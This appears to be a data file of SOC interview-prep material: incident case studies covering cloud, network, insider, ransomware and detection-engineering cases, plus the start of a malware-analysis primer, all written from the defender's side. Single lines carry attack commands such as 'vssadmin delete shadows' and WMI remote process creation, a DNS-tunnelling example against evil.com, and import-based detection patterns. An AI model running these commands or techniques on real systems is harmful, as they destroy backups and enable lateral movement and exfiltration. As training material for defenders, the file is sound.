    "category": "Cloud",
    "title": "Compromised Azure service principal with certificate persistence",
    "situation": "Anomalous Graph API activity from a service principal outside business hours.",
    "task": "Investigate identity-based persistence that reimaging cannot fix.",
    "actions": [
      "AuditLogs showed a <b>new certificate credential added</b> to an existing service principal 6 days earlier by a compromised admin account.",
      "Attacker used the service principal, not the user account — so the admin's password reset did nothing.",
      "The SP had Application.ReadWrite.All, meaning it could grant itself more permissions and create further backdoors.",
      "Mapped everything the SP had accessed across the full retention window, not just since the alert."
    ],
    "result": "Removed the certificate credential, audited every credential on every SP in the tenant, reduced the SP to least privilege, and implemented alerting on credential additions to service principals.",
    "lessons": [
      "<b>Cloud persistence is identity-based, not host-based.</b> Reimaging a laptop does nothing against a certificate on a service principal.",
      "Service principals are frequently over-permissioned and almost never audited.",
      "\"Add credential to application\" is a low-volume, high-value alert that most tenants do not have."
    ],
    "attack": [
      "T1098.001",
      "T1078.004"
    ],
    "followUp": "You reset the admin password. Why was the attacker still in?"
  },
  {
    "id": 27,
    "severity": "med",
    "level": "l2",
    "category": "Cloud",
    "title": "S3 bucket exposure discovered externally",
    "situation": "A security researcher reported a publicly readable bucket containing customer PII.",
    "task": "Determine exposure duration and whether anyone accessed it.",
    "actions": [
      "Bucket ACL had been changed 4 months earlier during a migration — a shortcut that was never reverted.",
      "<b>S3 server access logging was disabled</b>, so we could not prove who accessed it. Control-plane logging was on; data-plane was not.",
      "Reconstructed partial evidence from CloudFront logs and a small window of CloudTrail data events enabled on a subset.",
      "Could not rule out access — which, for a regulator, means you must assume access occurred."
    ],
    "result": "Locked the bucket, enabled Block Public Access account-wide, enabled data-plane logging everywhere, and engaged Legal for breach notification assessment given we could not disprove access.",
    "lessons": [
      "<b>The absence of logs is the incident.</b> Not being able to answer \"who read this\" is itself a finding.",
      "Control-plane logging without data-plane logging is a very common and very expensive gap.",
      "Preventative guardrails (Block Public Access, SCPs) beat detection for misconfiguration risk."
    ],
    "attack": [
      "T1530"
    ],
    "followUp": "You could not prove anyone accessed it. Is that good news?"
  },
  {
    "id": 28,
    "severity": "high",
    "level": "l2",
    "category": "Cloud",
    "title": "Token replay bypassing Conditional Access",
    "situation": "Sign-in from an unusual location with MFA satisfied but no MFA prompt sent.",
    "task": "Explain authentication that succeeds without authenticating.",
    "actions": [
      "SigninLogs showed MFA satisfied via a <b>previously-satisfied claim</b> — no fresh challenge occurred.",
      "The attacker had stolen a refresh/session token via infostealer malware on the user's personal device, then replayed it from their own infrastructure.",
      "Token binding was not enforced, so the token worked from any device and any IP.",
      "Conditional Access required MFA but the token already carried the MFA claim — so CA evaluated as satisfied."
    ],
    "result": "Revoked all refresh tokens for the user, enforced sign-in frequency for privileged roles, enabled continuous access evaluation, and required compliant devices for sensitive apps.",
    "lessons": [
      "<b>The token is the credential.</b> Once stolen, MFA and password resets are irrelevant until tokens are revoked.",
      "Revocation is a distinct action from password reset and analysts routinely forget it.",
      "Token protection / device binding is the structural fix; sign-in frequency is the stopgap."
    ],
    "attack": [
      "T1550.001",
      "T1539"
    ],
    "followUp": "MFA showed satisfied but no prompt was sent. What happened?"
  },
  {
    "id": 29,
    "severity": "med",
    "level": "l3",
    "category": "Cloud",
    "title": "Container escape from a misconfigured Kubernetes pod",
    "situation": "Falco alerted on unexpected process execution inside a production container.",
    "task": "Determine whether the attacker broke out of the container.",
    "actions": [
      "Initial access was RCE in a vulnerable application dependency inside the pod.",
      "The pod ran <b>privileged with hostPath mounting /</b> — so the container boundary was decorative.",
      "Attacker read the host filesystem, retrieved the kubelet credentials, and queried the API server.",
      "Service account token was auto-mounted with cluster-wide read on secrets — retrieved database credentials for other namespaces.",
      "Confirmed escape by observing processes in the host PID namespace."
    ],
    "result": "Killed the pod, rotated all cluster secrets and the compromised service account token, patched the dependency, enforced Pod Security Standards to block privileged pods and hostPath mounts.",
    "lessons": [
      "A container is not a security boundary unless configured as one. Privileged + hostPath = host access.",
      "Auto-mounted service account tokens with broad RBAC turn one pod compromise into a cluster compromise.",
      "Admission control (OPA/Kyverno) prevents this class of issue at deploy time rather than detecting it at runtime."
    ],
    "attack": [
      "T1611",
      "T1552.007"
    ],
    "followUp": "Was the container actually a boundary here?"
  },
  {
    "id": 30,
    "severity": "med",
    "level": "l1",
    "category": "Cloud",
    "title": "Mass file download from SharePoint by a departing employee",
    "situation": "Alert on 800 file downloads in 30 minutes from a single account.",
    "task": "Distinguish malicious staging from a legitimate work pattern.",
    "actions": [
      "Checked baseline: this user normally downloaded fewer than 20 files a day. An 800-file burst was a 40x deviation.",
      "Files were concentrated in the customer contracts library, not spread across the user's normal working folders.",
      "Downloads occurred at 21:40 on a Friday — outside all normal working patterns for that user.",
      "No compromise indicators: single known device, normal IP, no sign-in anomalies. This was the legitimate user.",
      "Checked HR: resignation submitted that morning. Security had not been notified."
    ],
    "result": "Escalated to HR and Legal immediately rather than acting unilaterally — insider cases are led by them. Preserved evidence with chain of custody, then revoked access once cleared.",
    "lessons": [
      "<b>Do not disable an insider suspect before Legal advises</b> — premature action tips them off and can compromise proceedings.",
      "No HR-to-SOC leaver notification existed; that feed was implemented with heightened monitoring during notice periods.",
      "Baselines make the case. \"800 downloads\" is meaningless without \"normally 20\"."
    ],
    "attack": [
      "T1530",
      "T1052"
    ],
    "followUp": "Why did you not disable the account immediately?"
  },
  {
    "id": 31,
    "severity": "high",
    "level": "l3",
    "category": "Cloud",
    "title": "Cross-tenant supply chain via a compromised MSP",
    "situation": "Unusual Azure Lighthouse delegated activity from a partner tenant.",
    "task": "Investigate an attacker with legitimate delegated access.",
    "actions": [
      "Our MSP had delegated admin access via Azure Lighthouse — legitimate, contracted, and necessary.",
      "The MSP tenant was compromised. The attacker inherited their delegated rights into <b>our</b> environment.",
      "All activity looked legitimate because it came through an authorized channel with authorized permissions.",
      "Caught it on behavioural anomaly only: delegated actions at 4AM local, from an ASN the MSP had never used, touching resources outside their normal scope."
    ],
    "result": "Suspended the Lighthouse delegation, audited all actions taken through it across the full retention window, rotated credentials on everything touched, and notified the MSP of their compromise.",
    "lessons": [
      "<b>Your attack surface includes every partner with delegated access.</b> Their security posture is your risk.",
      "Delegated access needs the same monitoring as internal admin access — most orgs monitor neither.",
      "Scoped delegation to specific resource groups with just-in-time elevation replaced standing access."
    ],
    "attack": [
      "T1199",
      "T1078.004"
    ],
    "followUp": "The access was authorized. How was it an incident?"
  },
  {
    "id": 32,
    "severity": "high",
    "level": "l2",
    "category": "Network",
    "title": "DNS tunnelling used for data exfiltration",
    "situation": "A host generated 40x the normal DNS query volume with unusually long subdomains.",
    "task": "Prove exfiltration over a protocol that is never blocked.",
    "actions": [
      "Query pattern: high-entropy subdomains like <code>a8f3d2b91c4e.evil.com</code> — the payload is base32-encoded in the label.",
      "Over 4,000 unique subdomains under one parent domain in 6 hours. That count is the strongest single indicator.",
      "Heavy TXT record usage — TXT gives the largest response payload for the return channel.",
      "DNS was allowed outbound with no inspection because \"DNS is infrastructure\" — the exact assumption the technique relies on.",
      "Decoded a sample of the subdomains and recovered fragments of a customer database."
    ],
    "result": "Blocked the parent domain, isolated the host, forced all DNS through inspected internal resolvers with egress DNS blocked at the firewall, and implemented DNS query volume/entropy detection.",
    "lessons": [
      "DNS tunnelling works because DNS is universally permitted. Egress filtering must include UDP/53.",
      "<b>Unique subdomain count per parent domain</b> is a cheap, high-signal detection.",
      "Slow exfil over DNS defeats volume-based DLP entirely — you need protocol-aware detection."
    ],
    "attack": [
      "T1071.004",
      "T1048.003"
    ],
    "followUp": "Why did volume-based DLP not catch 40GB leaving?"
  },
  {
    "id": 33,
    "severity": "high",
    "level": "l2",
    "category": "Network",
    "title": "Webshell on an internet-facing IIS server",
    "situation": "EDR alerted on w3wp.exe spawning cmd.exe on a public web server.",
    "task": "Find the entry point and determine what was reached.",
    "actions": [
      "Process tree: <code>w3wp.exe → cmd.exe → whoami → net user</code> — textbook post-webshell reconnaissance.",
      "IIS logs showed POSTs to <code>/uploads/img_up.aspx</code>, a file absent from source control.",
      "Root cause: the upload endpoint validated file extension <b>client-side only</b>. The attacker uploaded .aspx with a spoofed content type.",
      "Webshell matched a China Chopper variant. Commands run: enumeration, an attempted credential dump (blocked by EDR), and failed lateral SMB attempts.",
      "Source was a Tor exit node, with scanning from the same range 2 days prior."
    ],
    "result": "Captured memory, isolated, compared the entire webroot against source control to find other dropped files, reset the app pool identity, and rebuilt from a known-good image rather than cleaning in place.",
    "lessons": [
      "<code>w3wp.exe</code> spawning any shell is now high severity with no exceptions — there is no legitimate reason.",
      "Server-side validation plus non-executable upload directories is the actual fix.",
      "File integrity monitoring on webroots was missing; comparing against source control is a cheap detection."
    ],
    "attack": [
      "T1505.003",
      "T1190"
    ],
    "followUp": "Why rebuild instead of deleting the webshell?"
  },
  {
    "id": 34,
    "severity": "med",
    "level": "l1",
    "category": "Network",
    "title": "Port scan from an internal host that was an authorized scanner",
    "situation": "IDS alerted on internal port scanning across three subnets.",
    "task": "Verify before escalating and burning L2 time.",
    "actions": [
      "Scan source IP resolved to a host in the security tooling subnet.",
      "Checked the asset inventory — it was the authorized vulnerability scanner.",
      "Verified the scan window matched the documented scan schedule.",
      "Cross-checked that the scan profile matched expected behaviour rather than someone using the scanner as a pivot."
    ],
    "result": "Closed as benign true positive with documentation. Added the scanner IP to a scoped exclusion — scoped to source IP <b>and</b> scan window, not a blanket exclusion.",
    "lessons": [
      "Asset inventory is a triage tool. Without it, every authorized activity is an incident.",
      "I scoped the exclusion narrowly on purpose — if that scanner is ever compromised, activity outside its window still alerts.",
      "Recurring known-good activity should be documented in the playbook so L1 does not re-investigate it monthly."
    ],
    "attack": [],
    "followUp": "How do you exclude a scanner without creating a blind spot?"
  },
  {
    "id": 35,
    "severity": "high",
    "level": "l3",
    "category": "Network",
    "title": "Lateral movement via WMI and SMB across four servers",
    "situation": "Hunt found identical service creation events (7045) on multiple servers within minutes.",
    "task": "Map the full lateral movement path and find the origin.",
    "actions": [
      "Same randomized service name appeared on 4 servers within 12 minutes — automation, not a person clicking around.",
      "Correlated 4624 Type 3 logons with 4648 (explicit credentials) to build the movement graph: workstation → server A → server B and C → file server.",
      "The moving account was a service account with unnecessary local admin on all four servers.",
      "WMI process creation (<code>wmic /node: process call create</code>) was the execution mechanism — legitimate admin tooling.",
      "Traced origin back to a workstation with an infostealer infection 3 weeks earlier that had been closed as \"cleaned\"."
    ],
    "result": "Isolated all 5 hosts simultaneously, reset the service account, removed unnecessary local admin rights estate-wide, and reopened the original infostealer case with proper scoping.",
    "lessons": [
      "A closed \"cleaned\" malware ticket with no credential scoping became a multi-server compromise.",
      "<b>4648 is the underused event for lateral movement</b> — it shows explicit credential use across hosts.",
      "Flat local admin rights are what turn one compromised host into an estate-wide one."
    ],
    "attack": [
      "T1021.002",
      "T1047",
      "T1078"
    ],
    "followUp": "What is the difference between 4624 Type 3 and 4648 for tracking lateral movement?"
  },
  {
    "id": 36,
    "severity": "med",
    "level": "l2",
    "category": "Network",
    "title": "Rogue DHCP server causing traffic interception",
    "situation": "Users in one VLAN reported intermittent connectivity; some traffic was being intercepted.",
    "task": "Identify a network-layer attack that no security tool alerted on.",
    "actions": [
      "Clients were receiving DHCP leases with an unexpected default gateway and DNS server.",
      "Traced the rogue DHCP MAC to a switch port via the CAM table, then to a physical office location.",
      "The device was an unauthorized Raspberry Pi performing a man-in-the-middle: clients routed through it, allowing traffic capture and DNS manipulation.",
      "Determined it was a contractor testing something rather than an attacker — but the capability was identical either way."
    ],
    "result": "Removed the device, enabled DHCP snooping and dynamic ARP inspection on all access switches, enabled 802.1X port authentication, and captured the incident in a physical-access policy update.",
    "lessons": [
      "Network-layer attacks generate no SIEM alerts if you are not ingesting network infrastructure logs.",
      "<b>Intent does not change impact</b> — I scoped it as hostile until proven otherwise.",
      "DHCP snooping and DAI are free features that were simply never enabled."
    ],
    "attack": [
      "T1557.003"
    ],
    "followUp": "Nothing in the SIEM fired. How would you detect this next time?"
  },
  {
    "id": 37,
    "severity": "high",
    "level": "l2",
    "category": "Network",
    "title": "VPN appliance exploited via known CVE",
    "situation": "Threat intel warned of active exploitation of an edge appliance CVE we had deployed.",
    "task": "Determine if we were already compromised before patching.",
    "actions": [
      "Assumed compromise rather than assuming safety — checked before patching, because patching destroys evidence of exploitation.",
      "Reviewed appliance logs for the specific exploitation path in the advisory: found matching requests 6 days before the advisory published.",
      "Found an attacker-created local account and a modified configuration file providing persistence <b>that would survive patching</b>.",
      "Pivoted internally: found authentication from the appliance to internal hosts using harvested VPN credentials."
    ],
    "result": "Took the appliance offline, rebuilt from factory image rather than patching, rotated all certificates and VPN credentials, forced password reset for all VPN users, and hunted the internal activity.",
    "lessons": [
      "<b>Patching a compromised appliance leaves the attacker inside.</b> You must check for compromise first, then rebuild.",
      "Edge appliances are often outside EDR coverage and have poor logging — that is why they are targeted.",
      "This drove a hard patching SLA for internet-facing systems and a rule that edge devices are rebuilt, not patched, after any suspicion."
    ],
    "attack": [
      "T1190",
      "T1133"
    ],
    "followUp": "The advisory came out today. Why did you look at logs from last week?"
  },
  {
    "id": 38,
    "severity": "low",
    "level": "l1",
    "category": "Network",
    "title": "Beaconing that turned out to be legitimate software",
    "situation": "Beacon-like traffic: regular 60-second intervals to an external IP.",
    "task": "Avoid escalating a software update check as C2.",
    "actions": [
      "Perfectly regular 60s intervals with <b>zero jitter</b> — real C2 almost always jitters to evade exactly this detection.",
      "Destination resolved to a known software vendor CDN with a valid, long-standing certificate.",
      "Process was a signed, correctly-installed agent running from Program Files.",
      "Same pattern present on 400 other hosts — consistent with deployed software, not targeted compromise."
    ],
    "result": "Closed as benign true positive. Documented the process/destination pair as a known-good baseline entry rather than an IP exclusion.",
    "lessons": [
      "<b>Zero jitter argues against C2</b>, not for it — this is a useful discriminator for L1.",
      "Prevalence is a triage signal: something on 400 hosts is infrastructure; something on 1 host is interesting.",
      "Baselining known-good beacons is what makes the beacon hunt usable rather than noise."
    ],
    "attack": [],
    "followUp": "Regular intervals to an external IP. Why is that not C2?"
  },
  {
    "id": 39,
    "severity": "high",
    "level": "l2",
    "category": "Insider",
    "title": "Data staging before resignation",
    "situation": "DLP flagged a sales engineer uploading files to personal cloud storage.",
    "task": "Handle an insider case where evidence handling matters more than speed.",
    "actions": [
      "340 files with customer and pricing data uploaded over two hours, using legitimate credentials from a managed laptop — no compromise indicators at all.",
      "USB connection logged the previous evening at 21:40.",
      "File access history showed a sharp spike over three weeks, including repositories outside the user's normal scope.",
      "Personal email in Sent Items with a compressed archive attached.",
      "HR confirmed resignation that morning; destination was a direct competitor."
    ],
    "result": "Escalated to Legal and HR immediately, forensic image with chain of custody and hashes, no account action until Legal cleared it, then revoked access and retained the device.",
    "lessons": [
      "<b>Insider cases are evidence-handling exercises first, technical exercises second.</b>",
      "Acting before Legal advises can tip off the subject and compromise the case.",
      "No HR leaver feed existed — implemented, with heightened monitoring during notice periods."
    ],
    "attack": [
      "T1052.001",
      "T1567.002"
    ],
    "followUp": "Why is chain of custody critical here but not in a malware case?"
  },
  {
    "id": 40,
    "severity": "med",
    "level": "l2",
    "category": "Insider",
    "title": "Privilege misuse by a system administrator",
    "situation": "An admin accessed HR records unrelated to any ticket.",
    "task": "Investigate someone who has legitimate access to almost everything.",
    "actions": [
      "File access logs showed repeated reads of salary and disciplinary files for specific individuals over months.",
      "No ticket, change request, or business justification correlated with any of the access.",
      "The admin had legitimate technical rights — <b>no control was bypassed</b>. This was authorization misuse, not a technical compromise.",
      "Pattern correlated with periods around performance review cycles and one internal dispute."
    ],
    "result": "Escalated to HR and Legal. Implemented separation of duties so infrastructure admins could no longer read HR content, and moved sensitive HR data behind a separate access model with access reviews.",
    "lessons": [
      "<b>Technical controls do not detect authorization misuse — only business context does.</b>",
      "Admins reviewing their own access logs is a structural conflict; logging must go somewhere they cannot alter.",
      "Access without justification is a finding even when it is technically permitted."
    ],
    "attack": [
      "T1078.003"
    ],
    "followUp": "They had permission. What made this an incident?"
  },
  {
    "id": 41,
    "severity": "med",
    "level": "l1",
    "category": "Insider",
    "title": "Mass email forwarding rule to a personal address",
    "situation": "Alert on an inbox rule auto-forwarding all mail externally.",
    "task": "Determine compromise vs. insider vs. convenience.",
    "actions": [
      "Rule forwarded all mail to a personal Gmail account, created from the user's own known device and IP.",
      "No compromise indicators — normal sign-in pattern, no anomalous location, no MFA changes.",
      "Interviewed the user: they had set it up to work from their phone more easily, not maliciously.",
      "However, the mailbox contained regulated customer data, so the exposure was real regardless of intent."
    ],
    "result": "Removed the rule, disabled external auto-forwarding tenant-wide by policy, ran a data exposure assessment for what had already been forwarded, and delivered targeted training rather than disciplinary action.",
    "lessons": [
      "<b>Intent and impact are separate.</b> A well-meaning user created a genuine data exposure.",
      "Auto-forwarding is used by both attackers and users; blocking it tenant-wide removes an entire alert class.",
      "How you handle the benign case determines whether users cooperate in the real one."
    ],
    "attack": [
      "T1114.003"
    ],
    "followUp": "The user meant no harm. Was this still an incident?"
  },
  {
    "id": 42,
    "severity": "high",
    "level": "l3",
    "category": "Insider",
    "title": "Sabotage — logic bomb left by a departing admin",
    "situation": "Scheduled task discovered on a server referencing a deprovisioned admin account.",
    "task": "Find destructive code planted for future execution.",
    "actions": [
      "A scheduled task set to run 90 days out, created by an admin who had left 60 days earlier.",
      "The script deleted backup catalogs and dropped database tables — a logic bomb, not an accident.",
      "Audited for similar artifacts: found two more on other servers with different trigger dates, plus a modified startup script.",
      "Reviewed the departing admin's last two weeks of activity — the tasks were created in their final week."
    ],
    "result": "Removed all artifacts, engaged Legal, restored the account offboarding process to include scheduled task, cron, and GPO auditing, and implemented monitoring on task creation with future-dated triggers.",
    "lessons": [
      "Offboarding is not just disabling accounts — it must include auditing what the person created.",
      "<b>Future-dated scheduled tasks are inherently suspicious</b> and easy to hunt for.",
      "Privileged offboarding deserves a formal technical review, not just an HR checkbox."
    ],
    "attack": [
      "T1053.005",
      "T1485"
    ],
    "followUp": "How would you hunt for a logic bomb that has not fired yet?"
  },
  {
    "id": 43,
    "severity": "med",
    "level": "l2",
    "category": "Insider",
    "title": "Shadow IT — unsanctioned SaaS handling customer data",
    "situation": "CASB discovered 200+ users on an unapproved file-sharing platform.",
    "task": "Assess data risk without simply blocking a tool people rely on.",
    "actions": [
      "Proxy and CASB logs showed sustained use over 8 months, including uploads of customer documents.",
      "Investigated <b>why</b>: the approved tool had a 25MB attachment limit that made a core workflow impossible.",
      "Reviewed the vendor: no DPA in place, data residency outside our regulatory region, no SSO or audit logging available to us.",
      "Quantified exposure: several thousand documents, some containing PII."
    ],
    "result": "Rather than a hard block, worked with IT to raise the approved tool limits and provide a sanctioned large-file workflow, then blocked the unsanctioned platform once an alternative existed.",
    "lessons": [
      "<b>Shadow IT is a symptom of an unmet requirement.</b> Blocking without solving the need pushes users somewhere less visible.",
      "Data residency and DPA gaps were the real risk, not the tool itself.",
      "CASB discovery is only useful if paired with a path to a sanctioned alternative."
    ],
    "attack": [
      "T1567"
    ],
    "followUp": "Why not just block it on day one?"
  },
  {
    "id": 44,
    "severity": "high",
    "level": "l3",
    "category": "Ransomware",
    "title": "Active ransomware deployment via GPO — first two hours as IC",
    "situation": "Encryption began across multiple servers simultaneously at 02:00 on a Saturday.",
    "task": "Act as Incident Commander during active encryption.",
    "actions": [
      "<b>0–15 min:</b> Declared incident, opened bridge, assigned IC / technical lead / comms / scribe. Confirmed scope and verified our own tooling and identity plane were not compromised.",
      "<b>15–45 min:</b> Simultaneous deployment across servers pointed to a <b>GPO-based push</b> — cutting that channel was the single highest-leverage action. Disabled the malicious GPO and blocked the deployment share. Isolated encrypted hosts. Verified backups were offline and immutable, and took backup infrastructure off the domain.",
      "<b>45–90 min:</b> Identified patient zero and initial access. Established dwell time at 9 days. Checked for prior exfiltration — found 60GB to a file-sharing service 2 days earlier. Located persistence left for re-entry.",
      "<b>90–120 min:</b> Notified executives, Legal, and cyber insurance (insurers mandate early notification and often direct response). Assessed regulatory obligations. Recovery planned with a clean-build requirement."
    ],
    "result": "Encryption stopped at ~40% of servers. Restored from immutable backups into a rebuilt domain. No ransom paid. Full timeline documented by the scribe throughout.",
    "lessons": [
      "<b>Restoring into a compromised domain restarts the clock</b> — clean build is non-negotiable.",
      "GPO/SCCM/RMM as a deployment channel is the highest-leverage thing to cut in an active ransomware event.",
      "Restore-versus-pay is a business decision, not a SOC decision. My job was to give leadership accurate facts fast."
    ],
    "attack": [
      "T1486",
      "T1484.001",
      "T1490"
    ],
    "followUp": "What is the first thing you cut in an active ransomware event?"
  },
  {
    "id": 45,
    "severity": "high",
    "level": "l3",
    "category": "Ransomware",
    "title": "Ransomware precursor caught at the credential access stage",
    "situation": "Alert on LSASS access by an unusual process on a single workstation.",
    "task": "Recognize a ransomware precursor before deployment.",
    "actions": [
      "LSASS read by a non-standard process — credential dumping. On its own, a single-host issue.",
      "But the sequence around it was the story: recon (SharpHound) → credential access → attempted lateral movement, all within 40 minutes.",
      "This is the standard pre-ransomware kill chain. Treated it as ransomware-in-progress, not as a malware alert.",
      "Identified the affiliate toolkit from the artifacts and mapped what typically comes next — backup deletion and GPO deployment.",
      "Proactively hardened those specific next steps <b>while</b> investigating."
    ],
    "result": "Contained within 90 minutes of initial alert. No encryption ever occurred. Backups protected pre-emptively. Attacker lost access before the deployment stage.",
    "lessons": [
      "<b>Ransomware is the last step, not the first.</b> Every hour earlier in the chain you detect, the cheaper the incident.",
      "Credential access on a workstation deserves urgency, not a queue.",
      "Knowing the standard playbook of the actor let us defend the next step before they took it."
    ],
    "attack": [
      "T1003.001",
      "T1087",
      "T1021"
    ],
    "followUp": "Nothing was encrypted. Why did you call it a ransomware incident?"
  },
  {
    "id": 46,
    "severity": "high",
    "level": "l2",
    "category": "Ransomware",
    "title": "Backup infrastructure targeted before encryption",
    "situation": "Alerts on failed authentication to the backup server console.",
    "task": "Recognize backup targeting as the ransomware tell.",
    "actions": [
      "Repeated authentication attempts against the backup appliance from an internal host — attackers destroy backups <b>before</b> encrypting, because backups determine whether you pay.",
      "Source host was already compromised; the attacker was working through harvested credentials.",
      "Found deletion attempts against backup jobs and retention policies in the appliance logs.",
      "Also found <code>vssadmin delete shadows</code> executed on 3 servers — shadow copy deletion is a near-universal ransomware precursor."
    ],
    "result": "Isolated the source, protected the backup infrastructure by taking it off-domain with separate credentials, verified backup integrity, and contained before any encryption began.",
    "lessons": [
      "<b>Backup infrastructure should never be domain-joined or share credentials with production.</b>",
      "<code>vssadmin delete shadows</code> is one of the highest-value single detections available and costs nothing.",
      "Attacks on backups are not IT problems — they are ransomware in progress."
    ],
    "attack": [
      "T1490",
      "T1489"
    ],
    "followUp": "Why do attackers hit backups before encrypting?"
  },
  {
    "id": 47,
    "severity": "med",
    "level": "l1",
    "category": "Ransomware",
    "title": "Ransomware note found with no encryption — a hoax",
    "situation": "User reported a ransom note on their desktop demanding cryptocurrency.",
    "task": "Verify before triggering a major incident response.",
    "actions": [
      "Checked the files: <b>not encrypted</b>. All opened normally. No extension changes.",
      "No EDR detections, no anomalous process execution, no shadow copy deletion.",
      "The note arrived as an email attachment the user had opened — a scare-only extortion attempt with no actual capability.",
      "Verified across the estate that no encryption activity existed anywhere."
    ],
    "result": "Closed as a hoax after full verification. Did not trigger major incident procedures. Communicated clearly to the user, who was understandably alarmed.",
    "lessons": [
      "<b>Verify impact before declaring severity.</b> Declaring a false ransomware incident has real cost — executive escalation, insurer notification, business disruption.",
      "Equally, I verified thoroughly rather than dismissing it — a real event misclassified as a hoax is far worse.",
      "User communication matters; they reported correctly and deserved a clear answer."
    ],
    "attack": [],
    "followUp": "A ransom note appeared. What do you check before declaring an incident?"
  },
  {
    "id": 48,
    "severity": "med",
    "level": "l2",
    "category": "Detection Eng",
    "title": "Tuning a rule generating 400 alerts a day without losing coverage",
    "situation": "A PowerShell execution rule produced 400 alerts daily. Analysts were closing them without reading.",
    "task": "Reduce noise without creating a blind spot — the hard part.",
    "actions": [
      "Pulled 30 days of firings and grouped by user, host, parent process, and command line to find the actual drivers.",
      "92% came from three sources: a monitoring agent, a software deployment tool, and one admin's automation script.",
      "Excluded the specific <b>combination</b> (that account + that parent process + that command pattern) — never the account, host, or technique alone.",
      "Added compensating logic: a separate rule fires if those service accounts run PowerShell <b>outside</b> their narrow expected pattern.",
      "Validated by replaying a known true positive against the tuned rule to confirm it still fired."
    ],
    "result": "400 alerts/day down to 12, with proven retained detection. Change was version-controlled with rationale, approver, and a review date.",
    "lessons": [
      "<b>Alert fatigue is a security control failure.</b> A rule nobody reads provides zero detection.",
      "Exclusions must be narrow combinations, never blanket. A blanket exclusion is a permanent blind spot.",
      "Every tuning change needs a documented review date, otherwise exclusions accumulate silently forever."
    ],
    "attack": [
      "T1059.001"
    ],
    "followUp": "How do you tune without creating a blind spot?"
  },
  {
    "id": 49,
    "severity": "med",
    "level": "l3",
    "category": "Detection Eng",
    "title": "Purple team exercise exposing a silent detection failure",
    "situation": "A purple team exercise found 6 of 12 emulated techniques produced no alert.",
    "task": "Explain why detections that \"existed\" did not fire.",
    "actions": [
      "Rules existed for all 12 techniques on paper — the coverage heatmap looked healthy.",
      "Root causes for the 6 failures: 2 rules had broken field mappings after a connector upgrade; 2 relied on a log source that had silently stopped ingesting 5 weeks earlier; 1 had been over-tuned into uselessness; 1 had a logic error that never worked.",
      "<b>The log source had been dead for 5 weeks with no alert on ingestion health.</b> That was the most alarming finding.",
      "Rebuilt the failing detections and validated each with a live replay rather than a paper review."
    ],
    "result": "All 12 techniques detected on re-test. Implemented log source health monitoring, automated detection validation in CI, and quarterly emulation.",
    "lessons": [
      "<b>A rule existing is not a rule working.</b> Coverage claims must be evidence-backed, not metadata-backed.",
      "Silent log source failure is the most dangerous outage in a SOC because nothing alerts on the absence of data.",
      "Continuous validation via automated emulation replaced our annual assumption-based review."
    ],
    "attack": [],
    "followUp": "Your ATT&CK heatmap is green. Why do you not trust it?"
  },
  {
    "id": 50,
    "severity": "med",
    "level": "l2",
    "category": "Detection Eng",
    "title": "Closed an alert as false positive that turned out to be a real breach",
    "situation": "An alert I closed as FP was, three weeks later, confirmed as the initial access for a real intrusion.",
    "task": "Handle a genuine mistake correctly — this is the integrity question.",
    "actions": [
      "Escalated immediately with the original ticket, my reasoning at the time, and the new information. Delay would have been far worse than the original error.",
      "Reopened and re-scoped from the <b>original timestamp</b> — dwell time starts at first compromise, not at rediscovery.",
      "Contributed to the timeline honestly. My closure notes became evidence, which is exactly why documenting reasoning matters.",
      "In the post-incident review, focused on <b>why the decision looked correct at the time</b>: the enrichment data was missing, the playbook had no step for that alert class, and the rule provided no useful context."
    ],
    "result": "Full scope was recovered. Concrete control changes came out of it: added automated enrichment, a mandatory verification step before closing that alert class, and improved rule context.",
    "lessons": [
      "<b>Mature SOCs treat this as a process failure, not an individual one.</b> If analysts fear blame, they hide mistakes and dwell time grows.",
      "Documenting your reasoning at closure is what makes recovery possible later.",
      "I would rather be the analyst who reports their own error in hour one than the one who is found out in week four."
    ],
    "attack": [],
    "followUp": "You made the wrong call. What did you do next?"
  }
];

export const MALWARE: MalwareTopic[] = [
  {
    "id": "01",
    "level": "l1",
    "title": "The four analysis types — and when to use each",
    "body": "<p>Interviewers ask this to see if you know analysis is a <b>pipeline</b>, not one activity. Say it in escalating cost order:</p>\n <table class=\"tbl\"><tr><th>Type</th><th>What you do</th><th>Cost</th><th>Gives you</th></tr>\n <tr><td><b>Automated</b></td><td>Sandbox + AV + VT</td><td>Minutes</td><td>Known-family verdict, quick IOCs</td></tr>\n <tr><td><b>Static properties</b></td><td>Hash, strings, PE headers, entropy, imports — never execute</td><td>Minutes</td><td>Packed? Capability? Signed?</td></tr>\n <tr><td><b>Dynamic / behavioural</b></td><td>Detonate in isolated VM, watch behaviour</td><td>Hours</td><td>C2, persistence, files, injection</td></tr>\n <tr><td><b>Manual code reversal</b></td><td>IDA/Ghidra/x64dbg, unpack, read assembly</td><td>Days</td><td>Full logic, encryption keys, config</td></tr></table>\n <p class=\"say\"><b>Say this:</b> \"I escalate only as far as I need. If automated analysis gives me a family attribution and IOCs I can hunt with, I stop there. I go to manual reversal only when the sample is targeted, unknown, or when I need something the other stages cannot give me — like a hardcoded decryption key or the full C2 config.\"</p>",
    "caseStudy": "On an unknown binary with zero VT detections, I ran static first — entropy 7.8 and a 6-function import table told me it was packed before I ever executed it. That decided the whole approach: I needed to unpack, so the sandbox alone was never going to be enough."
  },
  {
    "id": "02",
    "level": "l2",
    "title": "Static analysis — what the file tells you before it runs",
    "body": "<p>Every artifact here is free, fast, and risk-free because nothing executes.</p>\n <ul>\n <li><b>Hashes</b> — MD5/SHA256 for VT, internal history, and estate-wide sweeps. <span class=\"warn\">Hashes change every build — never your only detection.</span></li>\n <li><b>Entropy</b> — Shannon entropy per section. Normal code sits ~5.5–6.5. <b>&gt;7.2 means packed or encrypted.</b></li>\n <li><b>Imports (IAT)</b> — the capability fingerprint. This is the single most useful static artifact:\n <pre>VirtualAllocEx + WriteProcessMemory + CreateRemoteThread → process injection\nCryptEncrypt / CryptGenKey + FindFirstFile              → ransomware\nInternetOpenUrl / WinHttpSendRequest                    → downloader / C2\nSetWindowsHookEx / GetAsyncKeyState                     → keylogger\nIsDebuggerPresent / CheckRemoteDebuggerPresent          → anti-analysis\nCreateService / StartService                            → persistence\nLsaOpenPolicy / SamConnect                              → credential access</pre>\n <span class=\"warn\">A tiny import table (under ~10) with high entropy = packed. The real imports are resolved at runtime.</span></li>\n <li><b>Strings</b> — URLs, IPs, mutex names, registry paths, ransom note text, PDB paths (often leak the developer's directory structure and project name), error messages.</li>\n <li><b>PE headers</b> — compile timestamp (can be faked, but inconsistency is itself a signal), section names (non-standard like <code>UPX0</code>, <code>.themida</code> reveal the packer), section characteristics (writable+executable is 